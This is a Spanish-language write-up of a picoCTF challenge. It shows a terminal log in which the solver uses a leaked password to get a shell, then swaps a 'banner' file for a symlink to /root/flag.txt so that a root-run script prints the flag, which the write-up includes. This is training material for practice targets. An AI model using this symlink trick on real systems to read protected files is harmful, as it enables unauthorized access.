

# reto
# Descripción
Can you abuse the banner?
The server has been leaking some crucial information on tethys.picoctf.net 63804. Use the leaked information to get to the server.
To connect to the running application use nc tethys.picoctf.net 51217. From the above information abuse the machine and find the flag in the /root directory.
# Solución 
## solución
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ open flag.txt
open flag.txt
-su: open: command not found
player@challenge:/root$ sudo oen flag.txt
sudo oen flag.txt
-su: sudo: command not found
player@challenge:/root$ su open flag.txt
su open flag.txt
No passwd entry for user 'open'
player@challenge:/root$ cd 
cd 
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
ln: failed to create symbolic link 'banner': File exists
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ rm banner
ln -s /root/flag.txt bannerrm banner
player@challenge:~$ 
ln -s /root/flag.txt banner
player@challenge:~$ ln -s /root/flag.txt banner_link
ln -s /root/flag.txt banner_link
player@challenge:~$ cat banner_link
cat banner_link
cat: banner_link: Permission denied
player@challenge:~$ ls  
ls
banner  banner_link  text
player@challenge:~$ banner
banner
-su: banner: command not found
player@challenge:~$ cd                                           
cd
player@challenge:~$ ln -sf /root/flag.txt banner                 
ln -sf /root/flag.txt banner
player@challenge:~$ ls  
ls
banner  banner_link  text
player@challenge:~$ ^C 
sameaxel33-picoctf@webshell:~$ nc tethys.picoctf.net 60215
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}

Al conectarme al primer puerto el servidor me respondio con una contraseña, despues me conecte al segundo puerto que al entrar me hacia un cuestionario, despues de responder me dejo entrar al shell, revisando root aparece un script en py que es el que abre al entrar al puerto, tambien viene un flag.txt que no me deja abir asi que aprovecho que el script abre el banner del inicio para abrir el flag, me volvi a conectar al servidor y en lugar de imprimir el banner me dio la bandera.
## solución 2




# referencias

